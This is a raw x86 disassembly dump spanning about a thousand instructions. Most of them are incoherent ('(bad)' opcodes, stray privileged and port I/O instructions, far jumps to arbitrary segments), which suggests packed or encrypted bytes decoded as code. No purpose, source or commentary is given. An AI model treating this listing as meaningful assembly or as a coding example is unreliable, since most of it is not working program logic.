  40414c:	adc    DWORD PTR [ecx-0x700fe0ad],edi
  404152:	sbb    eax,0xa24adaa1
  404157:	jne    0x4040f5
  404159:	sub    esp,0x6066940
  40415f:	jle    0x4040fa
  404161:	pop    ss
  404162:	test   al,0x8b
  404164:	sub    BYTE PTR [ebx+0x38],dh
  404167:	std    
  404168:	test   al,0x29
  40416a:	inc    ebp
  40416b:	ins    BYTE PTR es:[edi],dx
  40416c:	jae    0x404197
  40416e:	cs int 0x77
  404171:	stc    
  404172:	jge    0x4041bc
  404174:	adc    al,0x31
  404176:	jge    0x40416e
  404178:	push   ebp
  404179:	xchg   eax,ebp
  40417b:	adc    al,0x81
  40417d:	adc    dl,ah
  40417f:	add    BYTE PTR [eax+0x48bf7c05],cl
  404185:	jl     0x404156
  404187:	pop    edi
  404188:	(bad)  
  404189:	mov    ecx,DWORD PTR [edi-0x6e]
  40418c:	cld    
  40418d:	int3   
  40418e:	scas   eax,DWORD PTR es:[edi]
  40418f:	add    eax,0x83dc7dfc
  404194:	ja     0x404190
  404196:	mov    edx,0x4200fd92
  40419b:	daa    
  40419c:	cmp    esi,ebp
  40419e:	add    ch,dl
  4041a0:	mov    eax,ds:0xc59766d
  4041a5:	(bad)  
  4041a6:	pop    ebx
  4041a7:	clc    
  4041a8:	dec    ebp
  4041a9:	hlt    
  4041aa:	push   ebp
  4041ab:	cld    
  4041ac:	xchg   esi,eax
  4041ad:	jns    0x4041c3
  4041af:	cli    
  4041b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041b1:	imul   ecx,DWORD PTR [edx-0x2b],0xf03c0bed
  4041b8:	(bad)
  4041bc:	sub    DWORD PTR [ecx+0x58],esp
  4041bf:	imul   ebx,DWORD PTR [edx],0x54
  4041c2:	in     eax,dx
  4041c3:	call   DWORD PTR [ecx-0x37a0087]
  4041c9:	pop    es
  4041ca:	jecxz  0x404155
  4041cc:	std    
  4041cd:	pop    ds
  4041ce:	test   al,0x14
  4041d0:	pop    ds
  4041d1:	mov    ss,WORD PTR [eax]
  4041d3:	loope  0x4041c7
  4041d5:	aam    0xcb
  4041d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041d8:	sti    
  4041d9:	call   0x1ebd:0xf473ce0b
  4041e0:	sbb    eax,DWORD PTR [esi+0x14]
  4041e3:	pop    esi
  4041e4:	stos   DWORD PTR es:[edi],eax
  4041e5:	enter  0xe8c8,0xae
  4041e9:	dec    ebx
  4041ea:	xor    al,0xb5
  4041ec:	aas    
  4041ed:	clc    
  4041ee:	or     BYTE PTR [esp+eax*8+0x4c],dl
  4041f2:	push   0xb38e1844
  4041f7:	cdq    
  4041f8:	stos   DWORD PTR es:[edi],eax
  4041f9:	mov    ebp,0x40dde8ac
  4041fe:	and    al,0xea
  404200:	leave  
  404201:	adc    eax,0xae9f743
  404206:	lods   eax,DWORD PTR ds:[esi]
  404207:	dec    edi
  404208:	cmp    ebx,DWORD PTR [ecx+0xff18df]
  40420e:	in     eax,0x2f
  404210:	arpl   WORD PTR [esi],bp
  404212:	sbb    ecx,ebx
  404214:	adc    al,0x96
  404216:	daa    
  404217:	(bad)  
  404218:	and    bh,dh
  40421a:	dec    ebx
  40421b:	scas   eax,DWORD PTR es:[edi]
  40421c:	rcl    BYTE PTR [eax-0x79521d5e],1
  404222:	mov    ebp,0x2d86a378
  404227:	call   0xde35:0x675f5af8
  40422e:	pop    edx
  40422f:	jae    0x404232
  404231:	add    al,0x59
  404233:	test   esi,ebp
  404235:	or     eax,0x40e6aa27
  40423a:	cmp    eax,0x40
  40423d:	mov    DWORD PTR ds:0x42fd6e,0x793d
  404247:	jmp    0x4045a7
  40424c:	leave  
  40424d:	daa    
  40424e:	rcl    BYTE PTR [esi],1
  404250:	repnz aad 0xf1
  404253:	jecxz  0x404232
  404255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404256:	dec    ebp
  404257:	orps   xmm4,XMMWORD PTR [esi+0x184f0b3b]
  40425e:	jo     0x4042d0
  404260:	cmp    eax,0x6870707d
  404265:	mov    bh,0x93
  404267:	jno    0x4042e3
  404269:	jp     0x404297
  40426b:	inc    ebx
  40426c:	and    DWORD PTR [ebp+0x23],0x9fd436e1
  404273:	inc    esp
  404274:	jge    0x404292
  404276:	xchg   ecx,eax
  404277:	mov    al,BYTE PTR [ecx-0x1f4af5cc]
  40427d:	mov    edi,0x9efd22d9
  404282:	adc    al,0x36
  404284:	inc    edi
  404285:	fcmovne st,st(0)
  404287:	mov    WORD PTR [ebx-0x3dc088e0],es
  40428d:	and    eax,0xb82bde0a
  404292:	gs adc eax,0x664313cb
  404298:	inc    edx
  404299:	xchg   BYTE PTR [ebx],bh
  40429b:	jle    0x404284
  40429d:	xor    eax,0x54ef097e
  4042a2:	sub    DWORD PTR [ebx],ebp
  4042a4:	imul   eax,edx,0x812bbf3e
  4042aa:	es int3 
  4042ac:	adc    ecx,ebp
  4042ae:	dec    ecx
  4042af:	add    ch,BYTE PTR es:[eax]
  4042b2:	mov    esi,0x9c130bcd
  4042b7:	push   esi
  4042b8:	aas    
  4042b9:	jns    0x40430a
  4042bb:	mov    ?,edx
  4042bd:	add    al,0x1b
  4042bf:	mov    BYTE PTR [ecx],cl
  4042c1:	or     al,0x4f
  4042c3:	scas   al,BYTE PTR es:[edi]
  4042c4:	sbb    DWORD PTR [ebx+0x5d],esp
  4042c7:	fwait
  4042c8:	out    dx,al
  4042c9:	mov    ebx,0xf8070160
  4042ce:	pushf  
  4042cf:	or     cl,BYTE PTR [eax+ebp*8]
  4042d2:	lods   eax,DWORD PTR ds:[esi]
  4042d3:	jecxz  0x404267
  4042d5:	jae    0x40429b
  4042d7:	xchg   ebx,eax
  4042d8:	addr16 push cs
  4042da:	ds dec ebp
  4042dc:	pushf  
  4042dd:	clc    
  4042de:	mov    edx,0xf704bd05
  4042e3:	push   cs
  4042e4:	imul   esp,DWORD PTR [edx],0xc1645fda
  4042ea:	lock fisubr WORD PTR [edx-0x7d3fef57]
  4042f1:	fbstp  TBYTE PTR [esp+edx*2]
  4042f4:	jge    0x4042ec
  4042f6:	dec    esi
  4042f7:	out    dx,al
  4042f8:	leave  
  4042f9:	aas    
  4042fa:	fdiv   DWORD PTR [ecx+0x8]
  4042fd:	fincstp 
  4042ff:	cmp    al,0x99
  404301:	das    
  404302:	lock jle 0x40428b
  404305:	pop    edx
  404306:	push   ebx
  404307:	and    DWORD PTR [edx+0x40],ecx
  40430a:	js     0x404374
  40430c:	(bad)  
  40430d:	xor    BYTE PTR [ecx+0x5f],dl
  404310:	call   0x673e:0x67e12fef
  404317:	adc    DWORD PTR [edx-0x7d],edi
  40431a:	test   eax,0x460ed6c7
  40431f:	sub    eax,0x9b522543
  404324:	test   eax,0x99c4d3ae
  404329:	inc    esi
  40432a:	int    0xb
  40432c:	jmp    0x4042d8
  40432e:	xor    DWORD PTR [ecx],eax
  404330:	outs   dx,DWORD PTR ds:[esi]
  404331:	push   ecx
  404332:	cmp    ebx,DWORD PTR [ecx]
  404334:	push   0x20d06353
  404339:	push   edi
  40433a:	xor    BYTE PTR [esi],ch
  40433c:	mov    ch,0x2c
  40433e:	repnz and dh,BYTE PTR [edx+0xbd8de50]
  404345:	jp     0x4043ab
  404347:	bound  ebp,QWORD PTR [ebx]
  404349:	push   ebp
  40434a:	pop    ecx
  40434b:	jo     0x4043c0
  40434d:	cs sbb ebx,ebp
  404350:	jmp    0x4043cc
  404352:	or     eax,0x6be221f2
  404357:	xchg   edx,eax
  404358:	lods   al,BYTE PTR ds:[esi]
  404359:	test   al,0x26
  40435b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40435c:	outs   dx,BYTE PTR ds:[esi]
  40435d:	or     BYTE PTR [esi],cl
  40435f:	xor    edx,edx
  404361:	in     al,0x33
  404363:	popa   
  404364:	xchg   DWORD PTR [ebx],esp
  404366:	and    al,0xff
  404368:	addr16 pop edi
  40436a:	data16 (bad) 
  40436c:	jp     0x404308
  40436e:	bound  esp,QWORD PTR [edx+0x1c]
  404371:	mov    ds:0xf5af5fb9,al
  404376:	mov    ebx,0xdc12dc4a
  40437b:	mov    eax,ds:0xe9de6561
  404380:	add    edx,DWORD PTR [esi]
  404382:	mov    edx,0x2c7f8816
  404387:	mov    dh,0xda
  404389:	xor    eax,0x5cfb2859
  40438e:	or     eax,0xe8fb3e17
  404393:	pop    esi
  404394:	pop    ds
  404395:	mov    ebp,0x3af749c0
  40439a:	xchg   esi,eax
  40439b:	mov    ds:0x7750989f,eax
  4043a0:	sbb    BYTE PTR [edx],bl
  4043a2:	leave  
  4043a3:	mov    bh,0x7
  4043a5:	jbe    0x404328
  4043a7:	jo     0x40440b
  4043a9:	mov    al,ds:0xc75a6c4f
  4043ae:	mov    bl,ch
  4043b0:	and    al,0x7f
  4043b2:	jne    0x4043da
  4043b4:	cs dec edi
  4043b6:	pop    ecx
  4043b7:	cmc    
  4043b8:	inc    ecx
  4043b9:	dec    esi
  4043ba:	push   0x5194ea93
  4043bf:	jle    0x40438c
  4043c1:	mov    DWORD PTR [edi-0x41],ebp
  4043c4:	jnp    0x404424
  4043c6:	xor    BYTE PTR [esi+0x7b],bl
  4043c9:	(bad)  
  4043ca:	scas   eax,DWORD PTR es:[edi]
  4043cb:	retf   0xdcbb
  4043ce:	gs pop esp
  4043d0:	in     eax,dx
  4043d1:	xor    bl,BYTE PTR [edx-0x2f]
  4043d4:	cmp    BYTE PTR [edi+edx*8+0x46],bh
  4043d8:	call   0xa5f03037
  4043dd:	fwait
  4043de:	pusha  
  4043df:	adc    al,0x16
  4043e1:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4043e3:	pop    esi
  4043e4:	lods   al,BYTE PTR ds:[esi]
  4043e5:	and    esp,DWORD PTR [ecx]
  4043e7:	dec    ebp
  4043e8:	mov    edx,0xaa86f729
  4043ed:	jle    0x404436
  4043ef:	jb     0x4043b4
  4043f1:	xor    al,0xb4
  4043f3:	stc    
  4043f4:	mov    esp,0xa9a01636
  4043f9:	addr16 mov esp,0xdd6c1e14
  4043ff:	out    0x1b,eax
  404401:	fsubr  DWORD PTR [ecx+edx*1-0x1c]
  404405:	dec    BYTE PTR [eax+0x26]
  404408:	popa   
  404409:	xor    bh,dl
  40440b:	retf   
  40440c:	sbb    bl,BYTE PTR [ebx+ebp*2]
  40440f:	sub    ebp,DWORD PTR [ecx]
  404411:	adc    DWORD PTR [edx+0x37f9d758],edx
  404417:	dec    edx
  404418:	xchg   esp,eax
  404419:	xchg   esi,eax
  40441a:	mov    WORD PTR [edi-0x4],cs
  40441d:	div    DWORD PTR [ecx-0x68b69f07]
  404423:	mov    BYTE PTR [ebp-0x2f90aba0],ah
  404429:	cwde   
  40442a:	xchg   ebx,eax
  40442b:	(bad)  [eax-0x7fc9f6d4]
  404431:	jns    0x40441f
  404433:	adc    edi,0x3b
  404436:	push   eax
  404437:	loope  0x404430
  404439:	das    
  40443a:	lods   eax,DWORD PTR ds:[esi]
  40443b:	or     al,0x57
  40443d:	jnp    0x40447b
  40443f:	cmp    eax,0xf7d0a27
  404444:	fdivr  DWORD PTR [esp+edi*8+0x4d]
  404448:	aad    0xfc
  40444a:	test   ch,al
  40444c:	(bad)  
  40444d:	jae    0x4043f5
  40444f:	or     al,0xb8
  404451:	shr    DWORD PTR [esi],0x47
  404454:	or     BYTE PTR [esi-0x70fa24a5],dh
  40445a:	sub    ecx,DWORD PTR [edi-0x32]
  40445d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40445e:	ins    BYTE PTR es:[edi],dx
  40445f:	dec    edi
  404460:	arpl   di,cx
  404462:	pop    ebp
  404463:	jg     0x4044d0
  404465:	in     al,dx
  404466:	and    edx,edx
  404468:	inc    esp
  404469:	mov    BYTE PTR [edx+0x4ebd1d87],ah
  40446f:	xchg   esp,eax
  404470:	dec    ecx
  404471:	pop    esi
  404472:	ins    DWORD PTR es:[edi],dx
  404473:	jno    0x40445d
  404475:	push   es
  404476:	rcl    al,cl
  404478:	xor    esi,DWORD PTR [eax+0xd]
  40447b:	adc    BYTE PTR [edx+eax*2-0x243da856],cl
  404482:	pusha  
  404483:	inc    ebx
  404484:	mov    ch,0x8e
  404486:	inc    ecx
  404487:	sub    DWORD PTR [eax+esi*2+0xc],ebx
  40448b:	inc    ebx
  40448c:	pusha  
  40448d:	mov    ecx,0x3ba432e
  404492:	in     al,dx
  404493:	cmp    DWORD PTR [eax],ebp
  404495:	in     al,0x6
  404497:	rol    BYTE PTR [edi+0x66],0xb8
  40449b:	sub    DWORD PTR [ecx-0x7278acda],edi
  4044a1:	xchg   ecx,eax
  4044a2:	popf   
  4044a3:	inc    ebx
  4044a4:	std    
  4044a5:	loop   0x404510
  4044a7:	pavgw  mm1,QWORD PTR [edx-0x70e4019f]
  4044ae:	and    eax,0xe820d788
  4044b3:	cs jmp 0xbf8ac935
  4044b9:	(bad)  
  4044ba:	jle    0x4044fe
  4044bc:	mov    bl,0x4c
  4044be:	popf   
  4044bf:	mov    edi,0x1ab58bd5
  4044c4:	sub    eax,0xa1501f67
  4044c9:	shl    ch,cl
  4044cb:	ins    BYTE PTR es:[edi],dx
  4044cc:	cdq    
  4044cd:	ins    BYTE PTR es:[edi],dx
  4044ce:	sub    esi,DWORD PTR [ecx]
  4044d0:	push   ecx
  4044d1:	push   ebp
  4044d2:	sti    
  4044d3:	call   0x8553d7ca
  4044d8:	cmc    
  4044d9:	aad    0xff
  4044db:	nop
  4044dc:	lea    ebp,[edi]
  4044de:	out    dx,eax
  4044df:	xor    eax,0xda045a42
  4044e4:	retf   0x40c9
  4044e7:	mov    eax,ds:0x6c4f2f5b
  4044ec:	push   esi
  4044ed:	add    ebp,DWORD PTR [eax+0x3da601e0]
  4044f3:	or     BYTE PTR [edi+edi*2+0x26487b81],0x20
  4044fb:	sub    eax,0x6e099405
  404500:	or     DWORD PTR [edx],ebp
  404502:	retf   
  404503:	pop    edi
  404504:	or     dl,dh
  404506:	mov    bl,0x61
  404508:	es jae 0x40449f
  40450b:	sbb    eax,0x6e4e8dd7
  404510:	push   ss
  404511:	fisttp DWORD PTR [esi-0x26]
  404514:	imul   edx,DWORD PTR [edx-0x7c],0xffffff90
  404518:	gs push 0xff7644ba
  40451e:	xor    eax,ecx
  404520:	inc    edx
  404521:	mov    ah,0xeb
  404523:	mov    eax,0x2477bd8a
  404528:	adc    ebp,DWORD PTR [ebx+0x6c]
  40452b:	ins    BYTE PTR es:[edi],dx
  40452c:	and    ch,BYTE PTR [edx]
  40452e:	outs   dx,BYTE PTR ds:[esi]
  40452f:	and    ebp,DWORD PTR [ebp-0x15d7b07b]
  404535:	push   edi
  404536:	mov    fs,WORD PTR [eax]
  404538:	dec    edi
  404539:	and    BYTE PTR [esi],al
  40453b:	aad    0xf4
  40453d:	push   0xae5815d7
  404542:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404543:	and    BYTE PTR [eax],bh
  404545:	fstp   TBYTE PTR [eax-0x2c]
  404548:	mov    ds:0xda4d2e17,eax
  40454d:	icebp  
  40454e:	and    DWORD PTR [edi+ebx*8+0x6],0xf
  404553:	mov    ebp,0x68ae3940
  404558:	cmp    al,bh
  40455a:	das    
  40455b:	test   al,0xa0
  40455d:	cmp    al,0xf8
  40455f:	pop    ss
  404560:	add    bh,BYTE PTR [ecx-0x57]
  404563:	arpl   WORD PTR [esi],cx
  404565:	mov    bh,0x28
  404567:	mov    ecx,0xc1843a72
  40456c:	mov    al,ds:0x2ac85649
  404571:	xor    DWORD PTR [edi+0x44bc9523],esp
  404577:	pop    eax
  404578:	xor    al,0x9f
  40457a:	test   eax,0xafd46cc
  40457f:	sub    al,0x71
  404581:	add    BYTE PTR [ecx+0x47b2bbfb],cl
  404587:	mov    WORD PTR [ecx],ss
  404589:	cli    
  40458a:	add    al,0x63
  40458c:	ret    0x890d
  40458f:	or     DWORD PTR [ecx-0xb],edx
  404592:	out    dx,al
  404593:	pop    ebp
  404594:	cwde   
  404595:	sub    DWORD PTR [esi+eax*2],ebp
  404598:	test   DWORD PTR ds:0xb48b9c00,esp
  40459e:	addr16 adc DWORD PTR [bp+di],ecx
  4045a2:	pusha  
  4045a3:	adc    dh,BYTE PTR [ebx+0x2b]
  4045a6:	daa    
  4045a7:	jb     0x403ebe
  4045ad:	and    DWORD PTR ds:0x42fd82,edx
  4045b3:	mov    edx,DWORD PTR [ebp-0x8]
  4045b6:	jmp    0x404916
  4045bb:	push   ss
  4045bc:	jge    0x404620
  4045be:	add    BYTE PTR [ecx+0x73],dh
  4045c1:	jb     0x4045c8
  4045c3:	inc    edi
  4045c4:	sbb    ch,BYTE PTR [ecx+edx*2]
  4045c7:	dec    ebp
  4045c8:	scas   eax,DWORD PTR es:[edi]
  4045c9:	into   
  4045ca:	iret   
  4045cb:	or     al,0x24
  4045cd:	jo     0x40463f
  4045cf:	cmp    eax,0x2970707d
  4045d4:	pushf  
  4045d5:	xor    esp,DWORD PTR [ebx+0x51]
  4045d8:	sbb    al,0x46
  4045da:	mov    dh,0xdb
  4045dc:	sub    DWORD PTR [esi-0x16d1b759],ebx
  4045e2:	lods   al,BYTE PTR ds:[esi]
  4045e3:	jge    0x4045b8
  4045e5:	xchg   edi,eax
  4045e6:	push   ecx
  4045e7:	inc    esp
  4045e8:	or     DWORD PTR [ebp-0x2df68b2b],eax
  4045ee:	mov    bh,0xda
  4045f0:	packuswb mm1,mm0
  4045f3:	add    ebx,DWORD PTR cs:0x5b863d4a
  4045fa:	out    dx,al
  4045fb:	scas   al,BYTE PTR es:[edi]
  4045fc:	xchg   esi,eax
  4045fd:	cld    
  4045fe:	shl    DWORD PTR [esi-0x7d],cl
  404601:	sbb    eax,0x3990fca6
  404606:	mov    al,0x4b
  404608:	lock xor cl,BYTE PTR [ecx]
  40460b:	int3   
  40460c:	mov    ds:0xcd458ac4,al
  404611:	fs add edx,eax
  404614:	mov    al,0xda
  404616:	jg     0x404660
  404618:	add    DWORD PTR [edx-0x57],esi
  40461b:	into   
  40461c:	push   ebx
  40461d:	or     DWORD PTR [eax-0x6552dbf9],esp
  404623:	sti    
  404624:	iret   
  404625:	inc    ecx
  404626:	sbb    DWORD PTR [eax],esi
  404628:	jmp    0xc357:0x7084cb22
  40462f:	out    0x30,al
  404631:	jns    0x40464b
  404633:	or     eax,0x4a67f315
  404638:	aam    0x3
  40463a:	sub    eax,0x23fa606b
  40463f:	fiadd  WORD PTR [edi]
  404641:	in     al,0x9b
  404643:	push   0x1d
  404645:	std    
  404646:	xchg   edi,eax
  404647:	inc    edx
  404648:	aad    0x1f
  40464a:	mov    edx,DWORD PTR [ebx]
  40464c:	popa   
  40464d:	inc    esi
  40464e:	in     eax,dx
  40464f:	pop    edx
  404650:	sbb    al,0x91
  404652:	pop    ss
  404653:	and    edx,eax
  404655:	(bad)  
  404657:	inc    eax
  404658:	sub    DWORD PTR [eax-0xe3a9375],ecx
  40465e:	fistp  WORD PTR [ecx-0x13adcae5]
  404664:	fdiv   DWORD PTR [ebx+0x64551110]
  40466a:	pop    ds
  40466b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40466c:	test   BYTE PTR [esi],dl
  40466e:	mov    dl,0xa
  404670:	mov    esi,0xf4290c46
  404675:	mov    ss,WORD PTR [esi+0x62829c]
  40467b:	mov    bl,0x92
  40467d:	fnstsw WORD PTR [ebp-0x776be426]
  404683:	jmp    0xabbbd1a3
  404688:	xchg   ebx,eax
  404689:	push   0x17672953
  40468e:	aad    0xd8
  404690:	out    dx,al
  404691:	sbb    eax,0x24406d81
  404696:	cmp    DWORD PTR [ebx-0x713b0d3e],esp
  40469c:	lahf   
  40469d:	in     al,dx
  40469e:	ins    DWORD PTR es:[edi],dx
  40469f:	sbb    edi,0xb9bd561d
  4046a5:	(bad)  
  4046a6:	xor    esp,DWORD PTR [esi+0x17d20524]
  4046ac:	mov    ds:0xe97259fd,al
  4046b1:	dec    edx
  4046b2:	das    
  4046b3:	sub    DWORD PTR [ecx+ecx*2+0x5f],0xffffffec
  4046b8:	ins    BYTE PTR es:[edi],dx
  4046b9:	push   ds
  4046ba:	adc    edi,eax
  4046bc:	adc    al,al
  4046be:	cmp    al,0x9b
  4046c0:	mov    ds:0x3ca79eba,eax
  4046c5:	cmp    ebp,DWORD PTR [ebx]
  4046c7:	ror    DWORD PTR [ebp-0x38],1
  4046ca:	fidivr DWORD PTR [edx]
  4046cc:	xchg   esp,eax
  4046cd:	xchg   esi,eax
  4046ce:	add    ebp,DWORD PTR [ebx]
  4046d0:	lods   al,BYTE PTR ds:[esi]
  4046d1:	mov    DWORD PTR [eax],edx
  4046d3:	in     al,0xa3
  4046d5:	jno    0x404756
  4046d7:	shr    DWORD PTR [ebx],0x6
  4046da:	sub    BYTE PTR [edx],0x70
  4046dd:	xor    al,0x4d
  4046df:	das    
  4046e0:	fbld   TBYTE PTR [esi]
  4046e2:	or     BYTE PTR [edx],bl
  4046e4:	xor    edi,DWORD PTR [eax]
  4046e6:	push   DWORD PTR [esi+0x28]
  4046e9:	cmp    al,0xf2
  4046eb:	loopne 0x404682
  4046ed:	ds ret 
  4046ef:	shl    DWORD PTR [eax+0x10],0x9e
  4046f3:	jnp    0x4046fb
  4046f5:	xchg   BYTE PTR [eax+eax*4],bh
  4046f8:	arpl   WORD PTR [ecx-0x362f48ea],bp
  4046fe:	les    eax,FWORD PTR [ebx+0x4]
  404701:	or     edi,esp
  404703:	loop   0x40472c
  404705:	adc    bh,BYTE PTR [edi+0x3c]
  404708:	jl     0x404696
  40470a:	adc    esi,DWORD PTR ds:0xe774a789
  404710:	aam    0x19
  404712:	jnp    0x4046f1
  404714:	(bad)  
  404715:	jb     0x404771
  404717:	xchg   ebx,eax
  404718:	gs mov esp,0xb2bc252c
  40471e:	imul   ah
  404720:	mov    dh,0x26
  404722:	sbb    bh,BYTE PTR [ebx-0x4c8223fc]
  404728:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404729:	mov    dl,0xba
  40472b:	jg     0x40477f
  40472d:	(bad)  
  40472f:	bound  esp,QWORD PTR [ecx+0x15fbb84]
  404735:	mov    edi,DWORD PTR [ebp-0x49]
  404738:	les    ebp,FWORD PTR [eax-0x7d]
  40473b:	aad    0xa3
  40473d:	retf   
  40473e:	xchg   ebp,eax
  40473f:	jno    0x4046f6
  404741:	cmp    cl,ch
  404743:	dec    ecx
  404744:	adc    ecx,DWORD PTR ds:[edi]
  404747:	mov    eax,ds:0xf11285df
  40474c:	cmp    al,0x73
  40474e:	sahf   
  40474f:	lock fisub WORD PTR [edx+edx*1-0x50]
  404754:	es jecxz 0x4047c4
  404757:	add    DWORD PTR [ebx-0x15722bd2],edx
  40475d:	adc    DWORD PTR [edx-0x13],0x50
  404761:	stc    
  404762:	jnp    0x40473f
  404764:	mov    dh,0xdb
  404766:	jle    0x40475f
  404768:	cdq    
  404769:	lods   al,BYTE PTR ds:[esi]
  40476a:	adc    edi,edx
  40476c:	sbb    DWORD PTR ds:0x74aaee90,0x88f4cfe
  404776:	jns    0x404738
  404778:	mov    al,0x0
  40477a:	imul   ebp,DWORD PTR [eax],0xba4c6ff6
  404780:	imul   eax,DWORD PTR [ebx-0x6b35d1ed],0xfffffffc
  404787:	inc    esp
  404788:	cmp    dl,bh
  40478a:	dec    eax
  40478b:	adc    DWORD PTR fs:[esi+esi*2+0x1f],0xd6839115
  404794:	push   ebp
  404795:	adc    edx,edi
  404797:	push   esp
  404798:	jp     0x40480c
  40479a:	rol    DWORD PTR [edi],1
  40479c:	shr    DWORD PTR [eax+0x73d1a901],0xf2
  4047a3:	mov    ch,bl
  4047a5:	adc    esi,DWORD PTR [esi+0x62]
  4047a8:	pop    ecx
  4047a9:	repnz xor DWORD PTR [ecx+edi*8-0x7f277f6a],edx
  4047b1:	sti    
  4047b2:	or     DWORD PTR [esi-0xb],ecx
  4047b5:	fidivr WORD PTR [ebx-0xe]
  4047b8:	stos   BYTE PTR es:[edi],al
  4047b9:	(bad)  
  4047ba:	sbb    al,dl
  4047bc:	sub    al,0x21
  4047be:	mov    ds:0xcbce69ea,al
  4047c3:	mov    edx,0x3e48a022
  4047c8:	loop   0x40475b
  4047ca:	mov    bh,0x61
  4047cc:	cdq    
  4047cd:	and    ebp,0x4dd79be2
  4047d3:	out    dx,al
  4047d4:	xchg   ecx,eax
  4047d5:	fnstsw ax
  4047d7:	xor    eax,0x52dcb97d
  4047dc:	sti    
  4047dd:	inc    edi
  4047de:	mov    ebp,0xaba3625a
  4047e3:	test   DWORD PTR [ebp-0x60],ebp
  4047e6:	xchg   esp,eax
  4047e7:	mov    cl,0x39
  4047e9:	mov    eax,0xf1e0c2a1
  4047ee:	rcl    DWORD PTR [ebp-0x63],0x3c
  4047f2:	or     eax,0xe6a08021
  4047f7:	jo     0x404867
  4047f9:	xchg   ebx,eax
  4047fa:	int    0xc1
  4047fc:	dec    ebp
  4047fd:	dec    esi
  4047fe:	aas    
  4047ff:	jbe    0x895b80d3
  404805:	xchg   ebp,eax
  404806:	outs   dx,DWORD PTR ds:[esi]
  404807:	pop    ds
  404808:	sub    eax,edi
  40480a:	xor    DWORD PTR [esi-0x5378f2e0],ebx
  404810:	fwait
  404811:	push   ecx
  404812:	sub    dh,al
  404814:	push   ecx
  404815:	(bad)  
  404816:	xor    al,0x38
  404818:	pop    ss
  404819:	pop    esp
  40481a:	pop    eax
  40481b:	lods   eax,DWORD PTR ds:[esi]
  40481c:	xchg   esp,eax
  40481d:	jmp    0xcea9:0xff71be19
  404824:	je     0x40481b
  404826:	jns    0x40482f
  404828:	jg     0x4047e4
  40482a:	ret    
  40482b:	ins    DWORD PTR es:[edi],dx
  40482c:	test   DWORD PTR [eax],ebp
  40482e:	mov    DWORD PTR [edi+0x72719b16],edx
  404834:	sar    DWORD PTR [esi],0xa8
  404837:	and    DWORD PTR [esi-0x5b],0xfa76f08a
  40483e:	xchg   DWORD PTR [ebx-0x15408810],esp
  404844:	inc    ebx
  404845:	sub    ch,BYTE PTR [esi]
  404847:	inc    ebx
  404848:	jo     0x40489a
  40484a:	fisttp WORD PTR [ebp-0x34]
  40484d:	cmp    edx,DWORD PTR [ebp-0x6df3dc33]
  404853:	sub    cl,al
  404855:	mov    DWORD PTR [ebp+edx*8-0x34],ecx
  404859:	ins    DWORD PTR es:[edi],dx
  40485a:	push   0x55
  40485c:	gs test al,0x78
  40485f:	mov    cs,WORD PTR [ebx+0x0]
  404862:	(bad)
  404866:	push   ebp
  404867:	popfw  
  404869:	jns    0x404885
  40486b:	sub    al,0xc5
  40486d:	inc    DWORD PTR [ebx-0x54]
  404870:	std    
  404871:	mov    ebp,DWORD PTR [ebx]
  404873:	(bad)  [esi]
  404875:	sahf   
  404876:	mov    WORD PTR [edi+0x6],es
  404879:	cwde   
  40487a:	(bad)  
  40487b:	mov    ch,0x7d
  40487d:	xchg   esp,eax
  40487e:	mov    ds:0xf48e5199,al
  404883:	push   ebp
  404884:	jmp    0x9fe58842
  404889:	ins    DWORD PTR es:[edi],dx
  40488a:	loopne 0x404871
  40488c:	pop    esp
  40488d:	fs test eax,0x6a63c0e7
  404893:	mov    dl,0x87
  404896:	xchg   esp,eax
  404897:	std    
  404898:	inc    esi
  404899:	dec    esi
  40489a:	fwait
  40489b:	inc    edx
  40489c:	stos   BYTE PTR es:[edi],al
  40489d:	xchg   ebp,eax
  40489e:	out    dx,eax
  40489f:	gs add ebp,eax
  4048a2:	adc    BYTE PTR [edi],0xc0
  4048a5:	int    0xd
  4048a7:	ret    
  4048a8:	mov    eax,ds:0x4c6dd928
  4048ad:	and    BYTE PTR [edi],dh
  4048af:	in     eax,dx
  4048b0:	aad    0x57
  4048b2:	std    
  4048b3:	das    
  4048b4:	xor    eax,0xa7739712
  4048b9:	pop    es
  4048ba:	push   edx
  4048bb:	loope  0x40487f
  4048bd:	aaa    
  4048be:	jnp    0x404882
  4048c0:	adc    BYTE PTR [ebx],0xc6
  4048c3:	lods   al,BYTE PTR ds:[esi]
  4048c4:	push   esp
  4048c5:	inc    ebx
  4048c6:	cmp    esp,ecx
  4048c8:	pop    eax
  4048c9:	or     al,BYTE PTR [edi-0x79a73598]
  4048cf:	mov    esp,0x7e2c7774
  4048d4:	fisttp QWORD PTR [edx+ebx*4+0x3fc28c5]
  4048db:	mov    eax,0x9ea6aeed
  4048e0:	add    dl,dl
  4048e2:	dec    esi
  4048e3:	pop    ss
  4048e4:	call   0xb7dfff58
  4048e9:	add    al,BYTE PTR [eax-0x6807a901]
  4048ef:	xor    eax,0x1df20210
  4048f4:	pop    edx
  4048f5:	retf   0x9d4e
  4048f8:	es mov cl,0xc5
  4048fb:	jae    0x404892
  4048fd:	mov    eax,ds:0x8225dea2
  404902:	or     BYTE PTR [ecx+eiz*2+0x6e],0x86
  404907:	jecxz  0x404972
  404909:	outs   dx,BYTE PTR ds:[esi]
  40490a:	out    dx,eax
  40490b:	sti    
  40490c:	retf   0xf4d9
  40490f:	jne    0x40497c
  404911:	pop    ebx
  404912:	pop    esp
  404913:	cmp    eax,0x458b5d2e
  404918:	hlt    
  404919:	xor    edx,ecx
  40491b:	add    edx,esi
  40491d:	cmp    edx,eax
  40491f:	mov    DWORD PTR ds:0x42e11c,0x6f80
  404929:	je     0x405095
  40492f:	add    DWORD PTR ds:0x42e124,ecx
  404935:	push   ebx
  404936:	adc    DWORD PTR ds:0x42e6ff,ecx
  40493c:	push   edi
  40493d:	mov    edi,DWORD PTR [ebp+0x8]
  404940:	mov    eax,0x8a3e
  404945:	and    DWORD PTR ds:0x42e134,0x5964
  40494f:	xor    ax,WORD PTR [edi+edx*4+0x2]
  404954:	mov    edi,0x3b04
